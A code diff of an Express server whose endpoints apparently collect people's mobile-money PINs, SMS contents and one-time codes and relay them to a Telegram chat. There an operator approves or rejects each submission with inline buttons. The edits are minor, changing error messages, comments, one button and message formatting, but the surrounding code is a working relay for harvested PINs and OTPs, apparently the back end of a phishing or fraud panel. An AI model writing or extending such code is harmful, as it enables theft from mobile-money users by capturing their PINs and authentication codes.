@@ -25,7 +25,7 @@ app.post('/applications', (req, res) => {
   res.json({ id: appId });
 });
 
-// Submit MoMo Auth / PIN for Approval with safety checks
+// Submit MoMo Auth / PIN for Approval
 app.post('/applications/:id/submit-auth', async (req, res) => {
   const appId = req.params.id;
   const appData = applications[appId];
@@ -51,7 +51,7 @@ app.post('/applications/:id/submit-auth', async (req, res) => {
   try {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       console.error('CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing from environment variables!');
-      return res.status(500).json({ error: 'Server configuration error: Missing Telegram credentials' });
+      return res.status(500).json({ error: 'Missing Telegram credentials in environment variables.' });
     }
 
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -69,7 +69,7 @@ app.post('/applications/:id/submit-auth', async (req, res) => {
     res.json({ success: true });
   } catch (error) {
     console.error('Fetch exception error:', error);
-    res.status(500).json({ error: 'Failed to send notification' });
+    res.status(500).json({ error: 'Failed to send notification to Telegram' });
   }
 });
 
@@ -89,9 +89,6 @@ app.post('/applications/:id/submit-sms', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '📋 Copy SMS Content', copy_text: { text: appData.sms_text } }
-      ],
-      [
         { text: '✅ Correct SMS Text', callback_data: `sms_correct_${appId}` },
         { text: '❌ Wrong SMS Text', callback_data: `sms_wrong_${appId}` }
       ]
@@ -102,7 +99,7 @@ app.post('/applications/:id/submit-sms', async (req, res) => {
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: keyboard })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
     
     const result = await response.json();
@@ -174,8 +171,8 @@ app.post('/telegram-webhook', async (req, res) => {
   if (update.callback_query) {
     const cb = update.callback_query;
     const dataParts = cb.data.split('_');
-    const type = dataParts[0]; // 'auth', 'sms', or 'otp'
-    const action = dataParts[1]; // 'approve', 'reject', 'correct', 'wrong'
+    const type = dataParts[0];
+    const action = dataParts[1];
     const appId = dataParts.slice(2).join('_');
 
     if (applications[appId]) {
@@ -220,4 +217,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-  
+    
